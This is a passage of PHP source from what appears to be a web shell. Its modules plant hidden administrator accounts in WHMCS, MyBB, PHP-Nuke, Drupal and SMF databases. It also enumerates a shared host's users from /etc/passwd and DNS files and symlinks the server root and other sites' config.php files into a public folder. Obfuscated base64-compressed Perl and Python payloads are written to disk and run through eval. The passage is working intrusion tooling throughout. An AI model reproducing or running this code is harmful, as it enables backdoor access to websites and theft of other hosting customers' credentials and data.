create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS3'];
$username = $_POST['WHISKAS4'];
$password = $_POST['WHISKAS5'];
$admin = $_POST['WHISKAS8'];
$SQL = $_POST['WHISKAS9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['WHISKAS7']) && $_POST['WHISKAS7'] == 'mybb'){

echo __pre().'<center><div class="txtfont_header">| Mybb |</div><p><p>'.getConfigHtml('mybb').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7'=>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'Whiskas@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS3'];
$username = $_POST['WHISKAS4'];
$password = $_POST['WHISKAS5'];
$admin = $_POST['WHISKAS8'];
$SQL = $_POST['WHISKAS9'];
$prefix = $_POST['WHISKAS10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['WHISKAS8']) && $_POST['WHISKAS8'] == 'nuke'){

echo __pre().'<center><div class="txtfont_header">| PhpNuke |</div><p><p>'.getConfigHtml('phpnuke').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'Whiskas@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS3'];
$username = $_POST['WHISKAS4'];
$password = $_POST['WHISKAS5'];
$admin = $_POST['WHISKAS7'];
$SQL = $_POST['WHISKAS9'];
$prefix = $_POST['WHISKAS10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$solevisible=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['WHISKAS9']) && $_POST['WHISKAS9'] == 'drupal'){

echo __pre().'<center><div class="txtfont_header">| Drupal |</div><p><p>'.getConfigHtml('drupal').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,null,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'drupal\'); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'WHISKAS', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'XLi5264', 'inputSize' => '50', 'disabled' => true)
 );
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS4'];
$username = $_POST['WHISKAS5'];
$password = $_POST['WHISKAS6'];
$admin = $_POST['WHISKAS8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit 0,1");
$getDescuid = @mysqli_fetch_assoc($getDescuid);
$getDescuid = $getDescuid['uid'];
$getdescuid = $getDescuid++;
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','Whiskas@fbi.gov','filtered_html','1','Europe/Berlin','Whiskas@fbi.gov')") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($solevisible);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($solevisible);
$res = $solevis['uid'];
}
$solevisible=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}

if(isset($_POST['WHISKAS10']) && $_POST['WHISKAS10'] == 'smf'){

echo __pre().'<center><center><div class="txtfont_header">| SMF |</div><p><p>'.getConfigHtml('smf').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,null,this.username.value,this.password.value,this.prefix.value,this.admin.value,null,\'smf\'); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'smf_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'WHISKAS', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'XLi5264', 'inputSize' => '50', 'disabled' => true),
 );
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS3'];
$username = $_POST['WHISKAS5'];
$password = $_POST['WHISKAS6'];
$prefix = $_POST['WHISKAS7'];
$admin = $_POST['WHISKAS8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'solevisible');
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','Whiskas@fbi.gov')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
echo "</div>";
WHISKASfooter();
}
function WHISKASMakePwd(){if(_WHISKAS_file_exists("/etc/virtual/domainowners")||(_WHISKAS_file_exists("/etc/named.conf")&&_WHISKAS_file_exists("/etc/valiases"))){
		return "/home/{user}/public_html/";
	}
	$document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
	$public = end($document);
	array_pop($document);
	array_pop($document);
	$path = implode("/", $document) . "/{user}/" . $public;
	return $path;
}
function WHISKASGetDomains($state = false){
	$state = "named.conf";
	$lines = array();
	$lines = _WHISKAS_file('/etc/named.conf');
	if(!$lines){
		$lines = @scandir("/etc/valiases/");
		$state = "valiases";
		if(!$lines){
			$lines = @scandir("/var/named");
			$state = "named";
			if(!$lines && $state){
				$lines = _WHISKAS_file('/etc/passwd');
				$state = "passwd";
			}
		}
	}
	return array("lines" => $lines, "state" => $state);
}
function WHISKASCreateParentFolder(){
	// disabled - no longer creates data folder
	return;
}
function WHISKASsymlink(){
WHISKAShead();
WHISKASNum(9,10);
WHISKASCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __WHISKAS_DATA_FOLDER__);
echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
if(isset($_POST['WHISKAS2'])&&($_POST['WHISKAS2']=='symperl'||$_POST["WHISKAS2"]=="sympy")){
	$sympath = WHISKASMakePwd();
	@mkdir('cgiWHISKAS',0755);
	@chdir('cgiWHISKAS');
	WHISKAScgihtaccess('cgi');$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $WHISKAS_data="'.__WHISKAS_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
	$py = '#!/usr/bin/python'."\nimport zlib, base64\nWHISKAS_data='".__WHISKAS_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
	$cginame = "symperl.WHISKAS";
	$source = $perl;
	$lang = "perl";
	if($_POST["WHISKAS2"]=="sympy"){
		$cginame = "pysymlink.WHISKAS";
		$source = $py;
		$lang = "python";
	}
	@__write_file($cginame,$source);
	@chmod($cginame,0755);
	echo __pre();
	$resource = WHISKASEx("{$lang} {$cginame} {$sympath}",false,true,true);
	if(strlen($resource) == 0){
		echo WHISKASiFrameCreator('cgiWHISKAS/'.$cginame);
	}else{
		echo $resource;
	}
}
if(isset($_POST['WHISKAS4']) && $_POST['WHISKAS4']=='SymFile'){
if(function_exists('symlink')||_WHISKAS_can_runCommand(true,true)){
WHISKASNum(9,10);
echo __pre().'
<center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
<input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
<input type="text" name="symfile" placeholder="Example : WHISKAS.txt" size="60"/>
<p><input type="submit"value=" " name="symlink" /></p></form></center>';
$path = $_POST['WHISKAS5'];
$symname = $_POST['WHISKAS6'];
$solevisible58 = $_POST['WHISKAS7'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'WHISKASsymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
WHISKAScgihtaccess('sym', $sym_dir, $symname);
_WHISKAS_symlink("$path","$sym_dir/$symname");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__WHISKAS_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['WHISKAS2']) && $_POST['WHISKAS2']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_WHISKAS_can_runCommand(false,false)){
@mkdir('WHISKASsymlink',0777);
WHISKAScgihtaccess('sym','WHISKASsymlink/');
_WHISKAS_symlink('/','WHISKASsymlink/root');
$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#000F01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#000000;font-weight:bold;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
if(_WHISKAS_file_exists("/etc/named.conf") && !_WHISKAS_file_exists("/etc/virtual/domainowners") && _WHISKAS_file_exists("/etc/valiases/")){
echo "<center>";
$lines = array();
$anony_domains = array();
$anonymous_users = array();
$f_black = array();
$error = false;
$anonymous = false;
$makepwd = "/home/{user}/public_html/";
$domains = WHISKASGetDomains();
$lines =$domains["lines"];
$state = $domains["state"];
$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
$can_runcmd = _WHISKAS_can_runCommand(false,false);
if(!$is_posix && !$can_runcmd){
	$anonymous = true;
	$anony_domains = $domains["lines"];
	$lines = _WHISKAS_file('/etc/passwd');
}
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#000F01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#000000;font-weight:bold;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__WHISKAS_DATA_FOLDER__.'/WHISKASsymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($lines as $line){
	$domain = "";
	$owner = "";
	if($anonymous){
		$explode = explode(":", $line);
		$owner = $explode[0];
		$owner_len = strlen($owner) - 1;
		$userid = $explode[2];
		if((int)$userid < 500)continue;
		$domain = "[?????]";
		$temp_black = array();
		$finded = false;
		foreach($anony_domains as $anony){
			if($state == "named.conf"){
				if(@strstr($anony, 'zone')){
					preg_match_all('#zone "(.*)"#',$anony, $data);
					$domain = $data[1][0];
				}else{
					continue;
				}
			}elseif($state == "named" || $state == "valiases"){
				if($anony == "." || $anony == "..")continue;
				if($state == "named")$anony = rtrim($anony, ".db");
				$domain = $anony;
			}
			$sub_domain = str_replace(array("-","."), "", $domain);
			if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
				if(in_array($owner.$domain, $temp_black))continue;
				$sympath = str_replace("{user}", $owner, $makepwd);
				$http = "http://".$domain;
				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
				$count++;
				$temp_black[] = $owner.$domain;
				$finded = true;
			}
		}
		if(!$finded){
			$anonymous_users[] = $owner;
		}
	}else{
 		if($state == "named.conf"){
			if(@strstr($line, 'zone')){
				preg_match_all('#zone "(.*)"#',$line, $data);
				$domain = $data[1][0];
			}else{
				continue;
			}
		}elseif($state == "named" || $state == "valiases"){
			if($line == "." || $line == "..")continue;
			if($state == "named")$line = rtrim($line, ".db");
			$domain = $line;
		}
		if(strlen(trim($domain)) > 2 && $state != "passwd"){
			if(!_WHISKAS_file_exists('/etc/valiases/'.$domain, false))continue;
			if($is_posix){
				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
				$owner = $user["name"];
			}elseif($can_runcmd){
				$owner = WHISKASEx("stat -c '%U' /etc/valiases/".$domain,false,false);
			}
		}
	}
	if(!$anonymous){
		if(strlen($owner)==0 || in_array($owner.$domain, $f_black))continue;
		$sympath = str_replace("{user}", $owner, $makepwd);
		$http = "http://".$domain;
		if($state == "passwd"){
			$http = "javascript:alert('we cant find domain...')";
		}
		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
		$count++;
		$f_black[] = $owner.$domain;
	}
}
if($anonymous){
	foreach($anonymous_users as $owner){
		$sympath = str_replace("{user}", $owner, $makepwd);
		$http = "javascript:alert('we cant find domain...')";
		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, "[????]", $owner, $sympath), $template);
		$count++;
	}
}
$cant_symlink = false;
}else{
$is_direct = false;
$makepwd = WHISKASMakePwd();
if(_WHISKAS_file_exists("/etc/virtual/domainowners")){
	$makepwd = "/home/{user}/public_html";
	$is_direct = true;
}
$sole = _WHISKAS_file("/etc/virtual/domainowners");
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#000F01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#000000;font-weight:bold;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__WHISKAS_DATA_FOLDER__.'/WHISKASsymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$solevisible = explode(':', $visible);
